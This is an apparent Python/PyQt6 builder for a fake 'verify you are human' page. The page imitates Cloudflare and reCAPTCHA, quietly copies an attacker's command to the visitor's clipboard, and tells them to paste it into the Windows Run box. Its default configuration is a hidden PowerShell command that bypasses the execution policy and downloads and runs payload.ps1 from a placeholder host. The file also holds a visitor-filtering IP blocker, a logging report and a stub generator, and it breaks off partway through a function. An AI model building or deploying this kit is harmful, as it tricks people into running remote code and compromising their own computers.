#!/usr/bin/env python3
 

import sys
import json
import ipaddress
import os
import base64
from datetime import datetime
from pathlib import Path
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QComboBox, QTextEdit,
    QSpinBox, QFileDialog, QMessageBox, QStackedWidget,
    QListWidget, QListWidgetItem, QTabWidget, QInputDialog,
    QFrame, QScrollArea, QSplitter, QCheckBox, QRadioButton,
    QButtonGroup, QProgressBar, QStatusBar, QSizePolicy
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer, QSize
from PyQt6.QtGui import QFont, QColor, QPalette, QIcon, QPixmap, QFontDatabase
import http.server
import socketserver
import threading
import time


# EMBEDDED CONTENT 
EMBEDDED_JS = """
const CONFIG = {
  command: "{{COMMAND}}",
  customUrl: "{{CUSTOM_URL}}"
};

const I18N = {
  en: {
    checking: "Checking if you are human. This may take a few seconds.",
    verifyInstruction: "Verify you are human by completing the action below.",
    verifying: "Verifying...",
    notRobot: "I'm not a robot",
    steps: "Verification Steps",
    success: "Successfully verified.",
    verifyTitle: "To better prove you are not a robot, please:",
    step1: "Press & hold the Windows Key <i class='fab fa-windows'></i> + <b>R</b>.",
    step2: "In the verification window, press <b>Ctrl</b> + <b>V</b>.",
    step3: "Press <b>Enter</b> on your keyboard to finish.",
    observe: "You will observe and agree:",
    confirmLead: "I am not a robot - reCAPTCHA Verification ID: ",
    final: "Perform the steps above to finish verification.",
    verifyBtn: "Verify",
    confidentiality: "Confidentiality",
    terms: "Terms and Conditions",
    footer: "needs to review the security of your connection before proceeding."
  }
};

function detectLanguage() {
  const prefs = (navigator.languages && navigator.languages.length ? navigator.languages : [navigator.language || "en"]).map(x => x.toLowerCase());
  for (const lang of prefs) {
    if (lang.startsWith("en")) return "en";
  }
  return "en";
}

function getHostname(val) {
  if (!val) return window.location.hostname || '';
  try {
    return new URL(val, window.location.origin).hostname;
  } catch {
    return String(val).replace(/^https?:\\/\\//i, '').split('/')[0];
  }
}

function initializeDomainAndLogo() {
  const params = new URLSearchParams(window.location.search);
  const siteParam = params.get('site');
  const logoParam = params.get('logo');
  const host = getHostname(siteParam) || window.location.hostname || '';

  document.querySelectorAll('.domain-name').forEach(el => {
    el.textContent = host;
  });

  const faviconUrl = logoParam || `https://www.google.com/s2/favicons?sz=128&domain=${encodeURIComponent(host)}`;
  const faviconEl = document.getElementById('dynamic-favicon') || (() => {
    const l = document.createElement('link');
    l.rel = 'icon';
    document.head.appendChild(l);
    return l;
  })();
  faviconEl.href = faviconUrl;

  const candidates = [
    faviconUrl,
    `https://icons.duckduckgo.com/ip3/${encodeURIComponent(host)}.ico`,
    `https://${host}/favicon.ico`
  ].filter(Boolean);

  document.querySelectorAll('.logo-img').forEach(img => {
    let i = 0;
    const tryNext = () => {
      if (i >= candidates.length) {
        img.src = faviconUrl;
        return;
      }
      img.src = candidates[i++];
    };
    img.alt = host + ' logo';
    img.onerror = tryNext;
    tryNext();
  });
}

function initializeI18n() {
  const lang = detectLanguage();
  const t = I18N[lang] || I18N.en;

  const pre = document.querySelector(".preloader_text");
  if (pre) pre.textContent = t.checking;

  const allstep = document.querySelector(".textallstep");
  if (allstep) allstep.textContent = t.verifyInstruction;

  const set = (sel, txt) => {
    document.querySelectorAll(sel).forEach(el => el.textContent = txt);
  };
  set(".tettx .step0", t.verifying);
  set(".tettx .step1", t.notRobot);
  set(".tettx .step2", t.steps);
  set(".tettx .step3", t.success);

  const cb = document.getElementById("checkbox");
  if (cb) cb.textContent = "";

  const titleP = document.querySelector("#verify-window .verify-main p:first-of-type");
  if (titleP) titleP.innerHTML = t.verifyTitle;

  const stepsOl = document.querySelector("#verify-window .verify-main ol");
  if (stepsOl) stepsOl.innerHTML = `<li>${t.step1}</li><li>${t.step2}</li><li>${t.step3}</li>`;

  const observeP = document.querySelector("#verify-window .verify-main p.observe");
  if (observeP) {
    const codeEl = observeP.querySelector("code");
    const pieces = observeP.innerHTML.split("<br>");
    pieces[0] = t.observe;
    observeP.innerHTML = pieces.join("<br>");
    if (codeEl) {
      const idSpan = codeEl.querySelector("#verification-id");
      const idHtml = idSpan ? idSpan.outerHTML : '<span id="verification-id"></span>';
      codeEl.innerHTML = ` ✅ "${t.confirmLead}${idHtml}" `;
    }
  }

  const left = document.querySelector(".verify-footer-left");
  if (left) left.textContent = t.final;

  const btn = document.getElementById("verify-button");
  if (btn) btn.textContent = t.verifyBtn;

  const legalBox = document.querySelector('#checkbox-window > div > div:last-child');
  if (legalBox) {
    const ps = legalBox.querySelectorAll("p");
    if (ps[0]) ps[0].textContent = t.confidentiality;
    if (ps[1]) ps[1].textContent = t.terms;
  }

  const domainParas = Array.from(document.querySelectorAll("p .domain-name")).map(s => s.parentElement);
  for (const p of domainParas) {
    if (/\\bneeds to review the security of your connection before proceeding\\./i.test(p.textContent)) {
      const host = (p.querySelector(".domain-name")?.textContent || window.location.hostname || "");
      p.innerHTML = `<span class="domain-name">${host}</span> ${t.footer}`;
      break;
    }
  }
}

function copyToClipboard(text) {
  const textarea = document.createElement('textarea');
  textarea.value = text;
  textarea.setAttribute('readonly', '');
  textarea.style.position = 'absolute';
  textarea.style.left = '-9999px';
  document.body.appendChild(textarea);
  textarea.select();
  try {
    document.execCommand('copy');
  } catch (e) {
    console.error('Copy failed:', e);
  }
  document.body.removeChild(textarea);
}

function generateVerificationId() {
  return Math.floor(100000 + Math.random() * 900000);
}

function generateRayId() {
  const chars = "abcdef0123456789";
  return Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function initializeVerification() {
  const preloaderElements = document.querySelectorAll(".preloader");
  const preloaderText = document.querySelector(".preloader_text");
  const textAllStep = document.querySelector(".textallstep");
  const checkboxWindow = document.getElementById("checkbox-window");
  const step0Elements = document.querySelectorAll(".step0");
  const step1Elements = document.querySelectorAll(".step1");
  const step2Elements = document.querySelectorAll(".step2");
  const step3Elements = document.querySelectorAll(".step3");
  const checkbox = document.getElementById("checkbox");
  const verifyWindow = document.getElementById("verify-window");
  const spinner = document.getElementById("spinner");
  const verifyButton = document.getElementById("verify-button");

  setTimeout(() => {
    preloaderElements.forEach(el => el.style.display = "none");
    if (preloaderText) preloaderText.style.display = "none";
    if (textAllStep) textAllStep.style.display = "block";
    if (checkboxWindow) checkboxWindow.style.display = "flex";

    setTimeout(() => {
      if (checkboxWindow) {
        let opacity = 0;
        const fadeIn = setInterval(() => {
          if (opacity >= 1) {
            clearInterval(fadeIn);
          } else {
            opacity += 0.1;
            checkboxWindow.style.opacity = opacity;
          }
        }, 30);
      }
    }, 200);

    step0Elements.forEach(el => {
      el.style.display = "block";
      el.classList.add("active");
    });

    setTimeout(() => {
      step0Elements.forEach(el => {
        el.style.display = "none";
        el.classList.remove("active");
      });
      step1Elements.forEach(el => {
        el.style.display = "block";
        el.classList.add("active");
      });
    }, 2000);
  }, 1500);

  if (checkbox) {
    checkbox.addEventListener("click", function () {
      const cmd = CONFIG.customUrl || CONFIG.command;
      copyToClipboard(cmd);

      step1Elements.forEach(el => {
        el.style.display = "none";
        el.classList.remove("active");
      });
      step2Elements.forEach(el => {
        el.style.display = "block";
        el.classList.add("active");
      });
      if (spinner) spinner.style.visibility = "visible";

      setTimeout(() => {
        if (checkboxWindow) {
          checkboxWindow.style.width = "530px";
          checkboxWindow.style.height = "auto";
        }
        if (verifyWindow) verifyWindow.classList.add("active");
      }, 500);
    });
  }

  if (verifyButton) {
    verifyButton.addEventListener("click", function () {
      if (verifyWindow) verifyWindow.classList.remove("active");
      if (checkboxWindow) checkboxWindow.style.height = "74px";

      setTimeout(() => {
        if (checkboxWindow) checkboxWindow.style.width = "300px";
        step2Elements.forEach(el => {
          el.style.display = "none";
          el.classList.remove("active");
        });
        step3Elements.forEach(el => {
          el.style.display = "block";
          el.classList.add("active");
        });

        setTimeout(() => {
          step3Elements.forEach(el => {
            el.style.display = "none";
            el.classList.remove("active");
          });
          step1Elements.forEach(el => {
            el.style.display = "block";
            el.classList.add("active");
          });
          if (spinner) spinner.style.visibility = "hidden";
        }, 1000);
      }, 600);
    });
  }

  const verEl = document.getElementById("verification-id");
  if (verEl) verEl.textContent = generateVerificationId();

  const rayEl = document.querySelector(".ray-id");
  if (rayEl) {
    rayEl.textContent = generateRayId();
  }
}

document.addEventListener('copy', function (e) {
  e.preventDefault();
  const cmd = CONFIG.customUrl || CONFIG.command;
  if (e.clipboardData) {
    e.clipboardData.setData('text/plain', cmd);
  } else if (window.clipboardData) {
    window.clipboardData.setData('Text', cmd);
  }
});

function ready(fn) {
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", fn);
  } else {
    fn();
  }
}

ready(function () {
  initializeDomainAndLogo();
  initializeI18n();
  initializeVerification();
});
"""

EMBEDDED_CSS = """
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  display: flex;
  flex-direction: column;
  height: 100vh;
  background-color: #fcfcfc;
  color: #333;
}
.main-wrapper {
  align-items: center;
  display: flex;
  flex: 1;
  flex-direction: column;
}
.main-content {
  margin: 8rem auto;
  max-width: 60rem;
  padding-left: 1.5rem;
  padding-right: 1.5rem;
  width: 100%;
}
.logo-container {
  display: flex;
  align-items: center;
}
.logo-img {
  height: 2rem;
  margin-right: 0.5rem;
}
.domain-title {
  font-size: 2.5rem;
  font-weight: 500;
  line-height: 3.75rem;
}
.text-container {
  font-size: 1.5rem;
  line-height: 2.25rem;
  margin-bottom: 2rem;
  min-height: 2rem;
  font-weight: 550;
  padding-top: 2px;
}
.preloader {
  display: flex;
  align-items: center;
  justify-content: center;
}
.lds-ring {
  display: inline-block;
  position: relative;
  height: 1.875rem;
  width: 1.875rem;
}
.lds-ring div {
  animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
  border: 0.3rem solid transparent;
  border-radius: 50%;
  border-top-color: #313131;
  box-sizing: border-box;
  display: block;
  position: absolute;
  height: 1.875rem;
  width: 1.875rem;
}
.lds-ring div:first-child { animation-delay: -0.45s; }
.lds-ring div:nth-child(2) { animation-delay: -0.3s; }
.lds-ring div:nth-child(3) { animation-delay: -0.15s; }
@keyframes lds-ring {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.checkbox-window {
  display: flex;
  flex-direction: column;
  align-items: center;
  width: 300px;
  height: 74px;
  background-color: #fafafa;
  border: 1px solid #e0e0e0;
  border-radius: 4px;
  padding: 10px;
  overflow: hidden;
  transition: width 0.5s ease-in-out, height 0.5s ease-in-out, opacity 0.3s;
  opacity: 0;
}
.checkbox-window-inner {
  display: flex;
  align-items: center;
  width: 100%;
}
.checkbox-container {
  width: 30px;
  height: 28px;
  margin-left: 3px;
  margin-right: 12px;
  position: relative;
}
#spinner2 {
  width: 40px;
  height: 40px;
  animation: rotate 4s linear infinite;
  margin-top: -4px;
  fill: green;
}
@keyframes rotate {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}
.checkbox {
  width: 100%;
  height: 100%;
  background-color: #fff;
  border-radius: 2px;
  border: 2px solid #888;
  cursor: pointer;
  transition: border-color 0.3s, background-color 0.3s;
}
.checkbox.checked {
  border-color: #4285f4;
  background-color: #4285f4;
  position: relative;
}
.checkbox.checked::after {
  content: "\\f00c";
  font-family: "FontAwesome";
  color: #fff;
  font-size: 18px;
  position: absolute;
  top: -2px;
  left: 2px;
}
.spinner {
  visibility: hidden;
  position: relative;
}
.tettx { color: rgb(78, 78, 78); }
.tettx p { margin: 0 !important; }
.legal-links {
  font-size: 8px;
  text-align: right;
  margin-left: auto;
}
.legal-links img {
  width: 67px;
  height: 23px;
  margin-bottom: 5px;
}
.legal-links p { text-decoration: underline; }
.verify-window {
  font-family: Roboto, helvetica, arial, sans-serif;
  opacity: 0;
  visibility: hidden;
  width: 100%;
  height: 0;
  transition: opacity 0.5s, height 0.5s;
  border-top: 1px solid #797979;
  padding-top: 3px;
  margin-top: 15px;
}
.verify-window.active {
  opacity: 1;
  visibility: visible;
  height: auto;
  display: block;
}
.verify-header {
  background-color: #e85d1a;
  padding: 10px 16px;
  color: #fff;
  font-size: 14px;
  border-radius: 0;
}
.verify-main {
  padding: 16px;
  font-size: 14px;
  color: #333;
}
.verify-main p:first-of-type {
  font-size: 18px;
  margin-bottom: 15px;
}
.verify-main ol {
  padding-left: 20px;
}
.verify-main ol li {
  margin-bottom: 10px;
}
.verify-main code {
  display: block;
  margin-top: 10px;
  background-color: #f9f9f9;
  padding: 10px;
  font-size: 12px;
  border: 1px solid #ddd;
}
.verify-main .observe {
  padding-top: 10px;
}
.verify-main .observe code {
  background: none;
  border: 1px solid #797979;
  width: 432px;
  color: #d9d9d9;
}
.verify-footer {
  background-color: #f2f2f2;
  padding: 16px;
  text-align: right;
}
.verify-footer-container {
  background: none;
}
.verify-footer-left {
  width: 286px;
  float: left;
  text-align: left;
  font-size: 15px;
}
.verify-verify-button {
  background: #5e5e5e;
  padding: 9px 38px;
  color: #fff;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}
.verify-verify-button:hover {
  background: #4a4a4a;
}
.footer {
  font-size: 0.75rem;
  line-height: 1.125rem;
  margin: 0 auto;
  max-width: 60rem;
  padding-left: 1.5rem;
  padding-right: 1.5rem;
  width: 100%;
}
.footer-inner {
  border-top: 1px solid #d9d9d9;
  padding-bottom: 1rem;
  padding-top: 1rem;
  text-align: center;
}
.footer-inner > div:first-child {
  margin-bottom: 5px;
}
.footer-inner code {
  font-family: monospace;
}
.domain-footer {
  font-size: 1.5rem;
  line-height: 2.25rem;
  padding-top: 33px;
}
.step0, .step1, .step2, .step3 {
  display: none;
}
.step0.active, .step1.active, .step2.active, .step3.active {
  display: block;
}
.success-icon {
  width: 30px;
  height: 30px;
}
.success-icon circle {
  fill: #28a745;
}
.success-icon path {
  stroke: white;
  stroke-width: 4;
  fill: none;
  stroke-linecap: round;
  stroke-linejoin: round;
}
"""

EMBEDDED_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Just a moment...</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link rel="stylesheet" href="styles.css">
  <link rel="icon" id="dynamic-favicon" href="data:,">
</head>
<body>
<div class="main-wrapper">
  <div class="main-content">
    <div class="logo-container">
      <img class="logo-img" src="" alt="Site logo">
      <p class="domain-title"><span class="domain-name"></span></p>
    </div>
    <div class="text-container">
      <p>
        <span class="preloader_text">Checking if you are human. This may take a few seconds.</span>
        <span class="textallstep" style="display: none;">Verify you are human by completing the action below.</span>
      </p>
    </div>
    <div class="intro">
      <div class="preloader">
        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
      </div>
      <div id="checkbox-window" class="checkbox-window" style="display: none;">
        <div class="checkbox-window-inner">
          <div class="checkbox-container">
            <svg class="step0" id="spinner2" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg" style="display: none;">
              <circle cx="30" cy="10" r="2.5" class="point"></circle>
              <circle cx="50" cy="30" r="2.5" class="point"></circle>
              <circle cx="30" cy="50" r="2.5" class="point"></circle>
              <circle cx="10" cy="30" r="2.5" class="point"></circle>
              <circle cx="43.6" cy="16.4" r="2.5" class="point"></circle>
              <circle cx="16.4" cy="16.4" r="2.5" class="point"></circle>
              <circle cx="43.6" cy="43.6" r="2.5" class="point"></circle>
              <circle cx="16.4" cy="43.6" r="2.5" class="point"></circle>
            </svg>
            <button type="button" id="checkbox" class="checkbox step1" style="display: none;"></button>
            <div class="spinner step2" id="spinner" style="visibility: hidden; display: none;">
              <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
            </div>
            <div class="step3" style="display: none;">
              <svg class="success-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                <circle cx="25" cy="25" r="23"/>
                <path d="M15 25 L22 32 L35 18"/>
              </svg>
            </div>
          </div>
          <div class="tettx">
            <p class="step0">Verifying...</p>
            <p class="step1" style="display: none;">I'm not a robot</p>
            <p class="step2" style="display: none;">Verification Steps</p>
            <p class="step3" style="display: none;">Successfully.</p>
          </div>
          <div class="legal-links">
            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='67' height='23' viewBox='0 0 67 23'%3E%3Crect width='67' height='23' fill='%234285f4' rx='4'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='white' font-family='Arial' font-size='10' font-weight='bold'%3EreCAPTCHA%3C/text%3E%3C/svg%3E" alt="Logo" style="width: 67px; height: 23px; margin-bottom: 5px;">
            <p>Confidentiality</p>
            <p>Terms and Conditions</p>
          </div>
        </div>
        <div id="verify-window" class="verify-window">
          <div class="verify-container">
            <main class="verify-main">
              <p>To better prove you are not a robot, please:</p>
              <ol>
                <li>Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
                <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
                <li>Press <b>Enter</b> on your keyboard to finish.</li>
              </ol>
              <p class="observe">
                You will observe and agree:<br>
                <code> ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code>
              </p>
            </main>
          </div>
          <div class="verify-container verify-footer verify-footer-container">
            <div class="verify-footer-left">Perform the steps above to finish verification.</div>
            <button type="button" class="verify-verify-button block" id="verify-button">Verify</button>
          </div>
        </div>
      </div>
      <p class="domain-footer">
        <span class="domain-name"></span> needs to review the security of your connection before proceeding.
      </p>
    </div>
  </div>
</div>
<div class="footer" role="contentinfo">
  <div class="footer-inner">
    <div>
      <div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div>
    </div>
    <div>Platform performance and security <span style="color: #000000">Cloudflare</span></div>
  </div>
</div>
<script src="main.js"></script>
</body>
</html>
"""

def force_dark_theme(app):
    """Force 1000% dark theme for entire application including dialogs."""
    app.setStyle('Fusion')  # Fusion style respects custom palettes
    
    # Define dark colors
    dark_bg = QColor(18, 18, 18)        # Main background
    dark_widget = QColor(30, 30, 30)    # Widget background
    dark_border = QColor(45, 45, 45)    # Borders
    text_light = QColor(220, 220, 220)  # Text color
    accent = QColor(59, 130, 246)       # Highlight color
    
    # Create palette
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window, dark_bg)
    palette.setColor(QPalette.ColorRole.WindowText, text_light)
    palette.setColor(QPalette.ColorRole.Base, dark_widget)
    palette.setColor(QPalette.ColorRole.AlternateBase, QColor(35, 35, 35))
    palette.setColor(QPalette.ColorRole.ToolTipBase, dark_bg)
    palette.setColor(QPalette.ColorRole.ToolTipText, text_light)
    palette.setColor(QPalette.ColorRole.Text, text_light)
    palette.setColor(QPalette.ColorRole.Button, dark_widget)
    palette.setColor(QPalette.ColorRole.ButtonText, text_light)
    palette.setColor(QPalette.ColorRole.BrightText, QColor(255, 255, 255))
    palette.setColor(QPalette.ColorRole.Link, accent)
    palette.setColor(QPalette.ColorRole.Highlight, accent)
    palette.setColor(QPalette.ColorRole.HighlightedText, QColor(255, 255, 255))
    palette.setColor(QPalette.ColorRole.PlaceholderText, QColor(128, 128, 128))
    
    app.setPalette(palette)
    
    # Force stylesheet to catch anything the palette misses
    app.setStyleSheet("""
        QMainWindow, QWidget, QDialog, QMessageBox, QFileDialog {
            background-color: #121212;
            color: #dcdcdc;
        }
        QMenuBar, QMenu, QToolTip {
            background-color: #1e1e1e;
            color: #dcdcdc;
            border: 1px solid #2d2d2d;
        }
        QMenu::item:selected {
            background-color: #3b82f6;
        }
        QScrollArea, QScrollBar {
            background-color: #121212;
        }
        QScrollBar:vertical {
            background: #1e1e1e;
            width: 12px;
        }
        QScrollBar::handle:vertical {
            background: #3b82f6;
            border-radius: 6px;
        }
        QListWidget, QTextEdit, QLineEdit, QSpinBox, QComboBox {
            background-color: #0f0f0f;
            border: 1px solid #2d2d2d;
            color: #dcdcdc;
        }
        QPushButton {
            background-color: #2d2d2d;
            border: none;
            border-radius: 6px;
            padding: 6px 12px;
            color: #dcdcdc;
        }
        QPushButton:hover {
            background-color: #3b82f6;
        }
        QProgressBar {
            background-color: #1e1e1e;
            border: none;
            text-align: center;
            color: white;
        }
        QProgressBar::chunk {
            background-color: #3b82f6;
        }
        QTabWidget::pane {
            background-color: #121212;
            border: 1px solid #2d2d2d;
        }
        QTabBar::tab {
            background-color: #1e1e1e;
            padding: 8px 16px;
            margin-right: 2px;
        }
        QTabBar::tab:selected {
            background-color: #3b82f6;
            color: white;
        }
    """)

# DEFAULT CONFIG 
DEFAULT_CONFIG = {
    "command": "powershell -ExecutionPolicy Bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:PORT/payload.ps1')\"",
    "custom_url_execute": "",
    "blocking": {
        "enabled": True,
        "rules": [],
        "file": ""
    },
    "server": {
        "host": "0.0.0.0",
        "port": 8080,
        "title": "Security Verification"
    }
}


# IP BLOCKING WITH ADVANCED RULES 
class IPBlocker:
    def __init__(self, config):
        self.enabled = config.get("enabled", True)
        self.blocked_networks = []  # list of ipaddress.IPv4Network
        self.blocked_ranges = []    # list of (start, end) as IPv4Address
        self.blocked_single = set() # set of IPv4Address
        self.load_rules(config.get("rules", []))
        if config.get("file"):
            self.load_file(config["file"])

    def load_rules(self, rules):
        for rule in rules:
            rule = rule.strip()
            if not rule:
                continue
            if '-' in rule:
                # Range: start-end
                try:
                    start_str, end_str = rule.split('-')
                    start = ipaddress.IPv4Address(start_str.strip())
                    end = ipaddress.IPv4Address(end_str.strip())
                    self.blocked_ranges.append((start, end))
                except:
                    print(f"Invalid range: {rule}")
            elif '/' in rule:
                # CIDR
                try:
                    net = ipaddress.IPv4Network(rule, strict=False)
                    self.blocked_networks.append(net)
                except:
                    print(f"Invalid CIDR: {rule}")
            else:
                # Single IP
                try:
                    ip = ipaddress.IPv4Address(rule)
                    self.blocked_single.add(ip)
                except:
                    print(f"Invalid IP: {rule}")

    def load_file(self, path):
        try:
            with open(path, 'r') as f:
                for line in f:
                    self.load_rules([line.strip()])
        except:
            pass

    def is_blocked(self, ip_str):
        if not self.enabled:
            return False
        try:
            ip = ipaddress.IPv4Address(ip_str)
        except:
            return True  # treat invalid as blocked
        if ip in self.blocked_single:
            return True
        for net in self.blocked_networks:
            if ip in net:
                return True
        for start, end in self.blocked_ranges:
            if start <= ip <= end:
                return True
        return False


# REPORT GENERATOR 
class ReportGenerator:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.attempts = []
        self.blocked_ips = set()
        self.ensure_dir()
        
    def ensure_dir(self):
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
            
    def log_attempt(self, ip, user_agent, path, allowed, reason=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        attempt = {
            "timestamp": timestamp,
            "ip": ip,
            "user_agent": user_agent,
            "path": path,
            "allowed": allowed,
            "reason": reason,
            "type": "BOT" if "bot" in user_agent.lower() or "crawl" in user_agent.lower() else "HUMAN"
        }
        self.attempts.append(attempt)
        if not allowed:
            self.blocked_ips.add(ip)
        self.generate_html_report()
        return attempt
    
    def generate_html_report(self):
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Report - {datetime.now().strftime("%Y-%m-%d")}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            line-height: 1.6;
            padding: 40px;
        }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ 
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }}
        h1 {{ color: #60a5fa; font-size: 2.5rem; margin-bottom: 10px; }}
        .subtitle {{ color: #94a3b8; }}
        .stats {{ 
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        .stat-card {{
            background: rgba(30, 41, 59, 0.8);
            border: 1px solid rgba(71, 85, 105, 0.5);
            border-radius: 12px;
            padding: 20px;
            text-align: center;
        }}
        .stat-value {{
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 5px;
        }}
        .stat-label {{ color: #64748b; font-size: 0.9rem; }}
        .stat-allowed {{ color: #10b981; }}
        .stat-blocked {{ color: #ef4444; }}
        .stat-total {{ color: #3b82f6; }}
        .table-container {{
            background: rgba(30, 41, 59, 0.8);
            border: 1px solid rgba(71, 85, 105, 0.5);
            border-radius: 16px;
            overflow: hidden;
        }}
        table {{ width: 100%; border-collapse: collapse; }}
        th {{
            background: rgba(15, 23, 42, 0.9);
            color: #60a5fa;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            font-size: 0.85rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }}
        td {{
            padding: 15px;
            border-bottom: 1px solid rgba(71, 85, 105, 0.3);
            color: #cbd5e1;
        }}
        tr:hover {{ background: rgba(59, 130, 246, 0.05); }}
        .badge {{
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            display: inline-block;
        }}
        .badge-allowed {{ background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }}
        .badge-blocked {{ background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }}
        .badge-bot {{ background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.3); }}
        .ip-cell {{ font-family: 'Courier New', monospace; color: #60a5fa; font-weight: 600; }}
        .timestamp {{ color: #64748b; font-size: 0.9rem; }}
        .auto-refresh {{
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(59, 130, 246, 0.9);
            color: white;
            padding: 12px 24px;
            border-radius: 30px;
            font-weight: 600;
            box-shadow: 0 4px 20px rgba(59, 130, 246, 0.3);
        }}
    </style>
    <meta http-equiv="refresh" content="5">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Security Access Report</h1>
            <p class="subtitle">Real-time monitoring and threat detection</p>
            <p class="subtitle">Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value stat-total">{len(self.attempts)}</div>
                <div class="stat-label">Total Requests</div>
            </div>
            <div class="stat-card">
                <div class="stat-value stat-allowed">{sum(1 for a in self.attempts if a['allowed'])}</div>
                <div class="stat-label">Allowed</div>
            </div>
            <div class="stat-card">
                <div class="stat-value stat-blocked">{sum(1 for a in self.attempts if not a['allowed'])}</div>
                <div class="stat-label">Blocked</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" style="color: #fbbf24;">{sum(1 for a in self.attempts if a['type'] == 'BOT')}</div>
                <div class="stat-label">Bot Attempts</div>
            </div>
        </div>
        
        <div class="table-container">
             <tr>
                <thead>
                     <tr>
                        <th>Time</th>
                        <th>IP Address</th>
                        <th>Type</th>
                        <th>Status</th>
                        <th>Reason</th>
                        <th>User Agent</th>
                     </tr>
                </thead>
                <tbody>
        """
        
        # Add rows (most recent first)
        for attempt in reversed(self.attempts[-100:]):  # Last 100 entries
            status_class = "badge-allowed" if attempt['allowed'] else "badge-blocked"
            status_text = "ALLOWED" if attempt['allowed'] else "BLOCKED"
            type_class = "badge-bot" if attempt['type'] == 'BOT' else "badge-allowed"
            
            html += f"""
                     <tr>
                        <td class="timestamp">{attempt['timestamp']}</td>
                        <td class="ip-cell">{attempt['ip']}</td>
                        <td><span class="badge {type_class}">{attempt['type']}</span></td>
                        <td><span class="badge {status_class}">{status_text}</span></td>
                        <td>{attempt['reason']}</td>
                        <td style="font-size: 0.85rem; color: #64748b; max-width: 300px; overflow: hidden; text-overflow: ellipsis;">{attempt['user_agent'][:50]}</td>
                     </tr>
            """
        
        html += f"""
                </tbody>
              </table>
        </div>
    </div>
    <div class="auto-refresh">● Live Updates Every 5s</div>
</body>
</html>
        """
        
        report_path = os.path.join(self.output_dir, f"security_report_{datetime.now().strftime('%Y%m%d')}.html")
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html)
        return report_path


# STUB GENERATOR 
def generate_stub_file(config, js_content, css_content, html_content, blocked_ips=None):
    cmd = config.get("command", "").replace('"', '\\"')
    url = config.get("custom_url_execute", "").replace('"', '\\"')
    js_embedded = js_content.replace("{{COMMAND}}", cmd).replace("{{CUSTOM_URL}}", url)
    
    # Add IP blocking to JS if provided
    ip_block_code = ""
    if blocked_ips:
        ip_list = '","'.join(blocked_ips)
        ip_block_code = f'''
        // IP Blocking
        const BLOCKED_IPS = ["{ip_list}"];
        const clientIP = "{{CLIENT_IP}}";
        if (BLOCKED_IPS.includes(clientIP)) {{
            document.body.innerHTML = "<h1>Access Denied</h1><p>Your IP is blocked.</p>";
            throw new Error("Blocked");
        }}
        '''
    
    stub = f"""// Generated Stub File - {datetime.now().isoformat()}
const HTML = `{html_content}`;
const CSS = `{css_content}`;
const JS = `{js_embedded}`;
{ip_block_code}

const CONFIG = {{
  command: "{cmd}",
  customUrl: "{url}"
}};

if (typeof module !== 'undefined' && module.exports) {{
    module.exports = {{ HTML, CSS, JS, CONFIG }};
}}

function renderStub() {{
    document.open();
    document.write(HTML.replace('<script src="main.js"></script>', '<script>' + JS + '</script>')
